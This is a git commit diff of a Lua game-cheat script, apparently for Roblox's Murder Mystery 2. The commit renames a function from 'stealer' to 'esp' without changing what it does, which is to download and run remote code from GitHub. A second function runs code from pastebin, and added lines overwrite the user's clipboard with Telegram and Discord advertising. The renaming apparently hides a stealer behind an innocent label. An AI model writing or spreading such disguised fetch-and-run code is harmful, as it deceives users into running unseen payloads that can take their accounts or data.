6f1a1aa2ee7c56cf3ed02c67427c806a184b5eb0
JustTheGuest <memberxd710@gmail.com>
2025-02-17 09:33:37 +0200

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,10 +1,24 @@
 print("Script module loading")
-local function stealer()
+local function esp()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/JustTheGuest/script/refs/heads/main/mm.lua'))()
 end
 local function farm()
     loadstring(game:HttpGet('https://pastebin.com/raw/hjrMwtfa'))()
 end
 
-task.spawn(stealer)
+task.spawn(esp)
 task.spawn(farm)
+
+setclipboard("Public on top! Telegram: https://t.me/JospakHome / Discord: https://discord.gg/cS6qcnBStG")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Join us telegram!",
+    Text = "link's copied! t.me/JospakHome",
+    Duration = 10
+})
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Join us discord!",
+    Text = "Discord: discord.gg/cS6qcnBStG",
+    Duration = 13
+})
